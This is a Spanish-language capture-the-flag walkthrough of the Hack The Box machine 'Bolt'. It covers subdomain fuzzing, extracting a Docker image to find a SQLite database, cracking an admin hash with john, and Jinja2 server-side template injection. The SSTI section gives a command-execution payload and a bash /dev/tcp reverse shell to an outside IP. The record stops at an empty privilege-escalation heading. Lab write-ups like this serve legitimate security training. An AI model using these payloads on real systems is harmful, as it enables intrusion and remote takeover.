PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

-Entramos a la web del puerto 80 y añadimos el dominio bolt.htb al /etc/hosts

-Si entramos al puerto 443 nos redirige a el dominio --> passbolt.bolt.htb , lo añadimos al /etc/hosts también.

-Hacemos Fuzzing de subdominios por si hay más:
	-wfuzz -c --hl=504 -t 200 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "HOST: FUZZ.bolt.htb" http://bolt.htb
		-demo.bolt.htb
		-mail.bolt.htb

-En ambos hay un Panel de Login pero no podemos autenticarnos de momento

-En la siguiente ruta podemos descargarnos un archivo.tar:
	-http://bolt.htb/download

-La descomprimimos con tar:
	-tar -xf image.tar
		-Hay muchas carpetas, todas tienen dentro un archivo layer.tar que hay que descomprimir también

-Tras buscar algo interesante en muchas carpetas, llegamos a la siguiente carpeta:
	-cd a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2
	-tar -xf layer.tar
		**db.sqlite3** (Encontramos este archivo que no había en las otras carpetas)

-Vemos el contenido del archivo con strings:
	-strings db.sqlite3
		admin@bolt.htb$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.

-Lo rompemos con john:
	-john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
		deadbolt         (?)

-Nos autenticamos en http.bolt.htb con las credenciales obtenidas:
	-Username: admin
	-Password: deadbolt

-Entramos pero no encontramos nada interesante, así que seguimos investigando los archivos que descargamos anteriormente

-Encontramos un código de invitación en la siguiente ruta: 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/routes.py 
	**-Code: XNSS-HSJW-3NGU-8XTJ**

-Nos vamos a **demo.bolt.htb** y en **/register** nos podemos registrar aportando el código de invitación obtenido:

## Explotación SSTI

-En demo.bolt.settings, nos vamos a User Profile --> Settings y vamos a solicitar un cambio de nombre con el siguiente Payload:
	-Name: {{7*7}}

-Nos autenticamos con las mismas credenciales en mail.bolt.htb y nos ha llegado la petición:
	-49
	(Confirmamos que es vulnerable a SSTI)

-Probamos a ejecutar un comando:
	-Desde demo.bolt.htb:
		-Name: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
	-Desde mail.bolt.htb recibimos esto:
		-**uid=33(www-data) gid=33(www-data) groups=33(www-data)**

-Nos mandamos una RS para obtener acceso a la máquina:
	-Name: {{ self.__init__.__globals__.__builtins__.__import__('os').popen("bash -c 'bash -i >& /dev/tcp/10.10.14.30/1234 0>&1'").read() }}

-Hacemos click en el link que llega a mail.bolt.htb y obtenemos la conexión
	www-data@bolt:/home$ whoami
		www-data

## Escalada de Privilegios






